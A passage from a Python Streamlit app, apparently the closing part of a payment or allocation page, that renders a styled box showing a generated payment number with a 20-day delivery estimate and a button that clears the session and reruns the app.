        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
